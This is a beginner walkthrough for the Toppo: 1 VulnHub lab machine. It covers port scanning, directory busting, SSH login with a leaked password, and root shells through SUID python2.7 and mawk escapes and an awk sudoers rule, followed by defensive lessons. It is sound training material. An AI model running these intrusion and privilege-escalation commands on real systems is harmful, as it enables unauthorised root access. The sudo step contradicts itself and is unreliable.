# Toppo: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational walkthrough for students on an isolated lab network. **Only attack machines you own or are explicitly authorised to test.**

| Field | Value |
| --- | --- |
| **Machine** | Toppo: 1 |
| **Difficulty** | Easy (boot2root) |
| **Author** | Hadi Mene (@h4d3sw0rm) |
| **Released** | 12 Jul 2018 |
| **VulnHub Entry** | [https://vulnhub.com/entry/toppo-1,245/](https://vulnhub.com/entry/toppo-1,245/) |
| **Download** | [https://vulnhub.com/entry/toppo-1,245/#download](https://vulnhub.com/entry/toppo-1,245/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Debian Linux (32-bit, Debian 8 "Jessie", kernel 3.16 — varies by build) |

---

## 0. What you will learn

- How to find a target host on your lab subnet and scan it for open ports.
- How to browse a web server and discover hidden directories with a directory buster.
- How a leaked password on a website becomes a working SSH login (weak credentials).
- What a **SUID binary** is and why a SUID copy of `python2.7` (or `mawk`/`awk`) is a privilege-escalation gift.
- How to use [GTFOBins](https://gtfobins.github.io/) to turn a "harmless" system binary into a root shell.

**Prerequisites:** Kali Linux running and connected to the same host-only network as the target. See `docs/LAB-SETUP.md` and `docs/TOOLS.md`.

---

## 1. Reconnaissance — finding the target

> **Goal:** work out the target's IP address on your isolated network. You must be on the **same subnet** as the VM.

First, look at your own attacker IP and subnet:

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** your Kali box is `192.168.56.10` on the `192.168.56.0/24` network. The `/24` means the last number (1–254) is the "host" part, so the target must also start with `192.168.56.`.

Now list every live host on that subnet using **ARP** (fast, and it doesn't need a port to be open):

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH   (your Kali)
192.168.56.101  08:00:27:11:22:33   PCS Systemtechnik GmbH   (the target)
192.168.56.102  08:00:27:dd:ee:ff   PCS Systemtechnik GmbH
```

> **How to read it:** each line is a machine answering ARP. The address that is **not** your own is the target. In this lab we assume it is `192.168.56.101`.

**Target IP:** `192.168.56.101`

![finding the target](images/01-recon.png)

---

## 2. Enumeration — open ports and services

Now scan the target for open TCP ports and figure out what service listens on each.

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00051s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
...
```

> **How to read it:**
> - `-p-` scans **all 65,535** TCP ports (not just the common ones).
> - `--min-rate 1000` fires at least 1000 packets per second so the scan is quick.
> - `-T4` is an aggressive timing template (fine for a lab).
> - Each `open` line is an **attack surface**. Here: SSH (22), a web server (80), and `rpcbind` (111).

> **Note:** exact ports can vary by build; `rpcbind`/`111` is normally not directly useful on this box.

Next, fingerprint the versions and run Nmap's safe default scripts:

```bash
sudo nmap -sC -sV -p22,80,111 -oA scans/services 192.168.56.101
```

```text
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Toppo
111/tcp open  rpcbind 2-4 (RPC #100000)
```

> **How to read it:**
> - `-sV` guesses the **service and version** behind each port (very old OpenSSH/Apache = a hint, but here not the bug).
> - `-sC` runs Nmap's default script set (page titles, banners).

The `http-title: Toppo` tells us something is served on port 80. Let's look at it.

![nmap service scan output](images/02-nmap.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Look at the website

Open `http://192.168.56.101/` in a browser (or use `curl`). It is a simple Cowboy Bebop–themed static page with no login. Nothing sensitive on the front page — so we look for **hidden files and directories**.

```bash
curl -s http://192.168.56.101/ | head
```

```text
<!DOCTYPE html>
<html>
<head>
  <title>Toppo</title>
  ...
```

### 3.2 Directory busting with dirb

A **directory buster** tries thousands of common names (`/admin`, `/backup`, `/images` …) and reports which ones exist.

```bash
dirb http://192.168.56.101/
```

```text
+ http://192.168.56.101/admin/  (CODE:200|SIZE:1234)
+ http://192.168.56.101/manual (CODE:301|SIZE:0)
+ http://192.168.56.101/server-status (CODE:403|SIZE:0)
...
```

> **How to read it:** `CODE:200` means the page exists and is readable. `/admin/` is the interesting one. (`wpscan`, `gobuster dir`, or `ffuf` do the same job.)

### 3.3 The password leak

Browsing to `http://192.168.56.101/admin/` shows an open directory listing. Fetch the note inside it:

```bash
curl http://192.168.56.101/admin/notes.txt
```

```text
Note to myself :

I need to change my password :/
12345ted123 is too outdated but the technology isn't my thing
i prefer go fishing or watching soccer .
```

> **Why it works:** the admin left their own password in a world-readable file, *and* the password contains the username (`ted`). Classic weak-credential / information-disclosure mistake.

The only login services are SSH (22). The username is hinted by the password itself: **`ted`**.

### 3.4 SSH in as `ted`

```bash
ssh ted@192.168.56.101
```

```text
ted@192.168.56.101's password: 12345ted123
Linux Toppo 3.16.0-4-686-pae ...
Last login: ...
ted@Toppo:~$ id
uid=1000(ted) gid=1000(ted) groups=1000(ted),...
```

> **Why it works:** the leaked `12345ted123` is a valid SSH password for `ted`. We now have a real interactive shell on the box.

```text
ted@Toppo:~$ whoami
ted
```

![foothold via leaked SSH credentials](images/04-foothold.png)

> **Note:** Toppo has no separate `user.txt`; the only flag lives in `/root`, so we go straight to privilege escalation.

---

## 4. Privilege escalation — becoming root

We are user `ted` (uid 1000). We want uid 0 (root). Systematically check the usual suspects.

### 4.1 Sudo rights

```bash
sudo -l
```

```text
[sudo] password for ted:
sudo: command not found
```

> **How to read it:** `sudo -l` lists what the current user may run as root. On this build `sudo` is not installed, but that does **not** mean there is no rule — read the config file directly:

```bash
cat /etc/sudoers
```

```text
ted ALL=(root) NOPASSWD: /usr/bin/awk
```

> **Why it matters:** `/etc/sudoers` grants `ted` permission to run **`awk` as root without a password**. `awk` can execute shell commands, so this alone is a root shell. (This line varies between builds — some builds ship the SUID bug below instead.)

### 4.2 SUID binaries (the reliable path)

A **SUID** binary runs with the **owner's** privileges instead of yours. If a root-owned binary is SUID, it runs as root.

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/sbin/mount.nfs
/usr/bin/python2.7
/usr/bin/mawk
/usr/bin/gpasswd
/usr/bin/passwd
/bin/su
...
```

> **How to read it:**
> - `find /` searches from the filesystem root.
> - `-perm -4000` matches files with the SUID bit set.
> - `-type f` only files; `2>/dev/null` hides "permission denied" noise.
> - **`/usr/bin/python2.7`** and **`/usr/bin/mawk`** are SUID-root here — hugely dangerous.

Confirm the SUID flag (the `s` where you'd expect an `x`):

```bash
ls -l /usr/bin/python2.7 /usr/bin/mawk
```

```text
-rwsrwxrwx 1 root root 3889608 /usr/bin/python2.7
-rwsr-xr-x 1 root root   84856 /usr/bin/mawk
```

### 4.3 Exploit it

GTFOBins documents how to abuse these. The robust Python technique is:

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

```text
# id
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** because `python2.7` is SUID-root, the `os.execl` call starts `/bin/sh` while the process still holds root's **effective** uid; the `-p` flag tells `sh` **not** to drop it. (A plain `pty.spawn("/bin/bash")` sometimes loses root because `bash` resets privileges — use the `-p` form above.)

The `mawk` alternative (also SUID):

```bash
mawk 'BEGIN {system("/bin/sh")}'
id
```

And the `awk` **sudo** path (from 4.1):

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

### 4.4 The root flag

```bash
cd /root
ls -la
cat /root/flag.txt
```

```text
flag.txt
...
Congratulations ! there is your flag : 0wnedlab{p4ssi0n_c0me_with_pract1ce}
```

![root flag](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Information disclosure (password in a readable file) + weak password | `http://target/admin/notes.txt` | SSH credentials leaked; attacker logs in as `ted` |
| 2 | Directory listing enabled | Apache `/admin/` | Exposes sensitive files to anonymous visitors |
| 3 | SUID-root on an interpreter (`python2.7`, `mawk`) | `/usr/bin/` | Any local user can spawn a root shell |
| 4 | Over-permissive `sudoers` rule (`awk` as root, NOPASSWD) | `/etc/sudoers` | Local user escalates to root via `awk` |

---

## 6. Defensive lessons (blue team)

- **Never store credentials in world-readable files.** Secrets belong in a password manager or a secrets store, and default/weak passwords must be rotated.
- **Disable Apache directory listing** (`Options -Indexes`) so `/admin/` can't be browsed.
- **Audit SUID/SGID bits.** No interpreter (`python`, `perl`, `mawk`, `awk`) should ever be SUID-root. Find problems with `find / -perm -4000 -type f 2>/dev/null` and remove needless bits.
- **Least-privilege sudo.** Avoid `NOPASSWD` rules, especially for binaries with shell escapes. Prefer narrowly scoped wrappers over `awk`/`find`/`vim`.
- **Detections:** alert on new SSH logins from unexpected hosts, on `sudoers` changes, and on processes with `euid=0` whose `ruid` is a normal user (e.g. `ps -eo pid,euid,ruid,cmd`).

---

## 7. References

- VulnHub entry: [https://vulnhub.com/entry/toppo-1,245/](https://vulnhub.com/entry/toppo-1,245/)
- Community writeups consulted:
  - [rootkiddie — Vulnhub Toppo 1 Write Up](https://rootkiddie.com/blog/post/ctf/toppo/toppo/)
  - [razrsec — [VulnHub] Toppo Walkthrough](https://blog.razrsec.uk/toppo-walkthrough/)
  - [NullCereal — Toppo Walkthrough](https://nullcereal.com/2018/08/toppo-walkthrough/)
  - [Modern Samurai — CTF Walkthrough: Toppo](https://www.modernsamurai.info/top/)
  - [AlfaExploit — Toppo](https://alfaexploit.com/en/posts/toppo/)
- Tool technique references:
  - [GTFOBins — python](https://gtfobins.github.io/gtfobins/python/)
  - [GTFOBins — mawk](https://gtfobins.github.io/gtfobins/mawk/)
  - [GTFOBins — awk](https://gtfobins.github.io/gtfobins/awk/)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with `arp-scan`
- [ ] `images/02-nmap.png` — port/service scan (22/80/111)
- [ ] `images/03-enum.png` — `/admin/notes.txt` leaking the password
- [ ] `images/04-foothold.png` — SSH login as `ted`
- [ ] `images/05-shell.png` — the `ted` shell
- [ ] `images/06-user-flag.png` — (no user flag on this box — note it)
- [ ] `images/07-privesc.png` — SUID `python2.7` / `mawk` (or `sudoers` `awk`)
- [ ] `images/08-root-flag.png` — `/root/flag.txt`

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md)._
